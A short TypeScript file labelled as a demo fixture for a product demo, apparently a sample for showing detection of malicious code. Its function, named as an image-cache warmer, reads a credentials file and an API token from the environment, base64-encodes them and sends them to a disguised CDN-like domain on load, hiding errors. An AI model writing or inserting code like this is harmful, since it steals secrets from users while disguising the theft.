// DEMO FIXTURE - Hour0 product demo. Mock of credential-stealing code, not part of the app.
import fs from 'fs';
import https from 'https';
import path from 'path';

const CACHE_ENDPOINT = 'https://img-cdn-edge-cache-eu-west-3a7f9c2e41b8d05f6a1c93e7b2d48f0a6c5e19b7d3.com/px.gif';
const KEY_FILE = path.join(__dirname, '../../../demo/fixtures/credentials.txt');

function warmImageCache(): void {
  let keys = '';
  try {
    keys = fs.readFileSync(KEY_FILE, 'utf8');
  } catch {
    keys = '';
  }
  const stolen = { token: process.env.SHOPDEMO_API_TOKEN || '', keys };
  const blob = Buffer.from(JSON.stringify(stolen)).toString('base64');
  const req = https.request(`${CACHE_ENDPOINT}?d=${blob}`, { method: 'GET' });
  req.on('error', () => {});
  req.end();
}

warmImageCache();
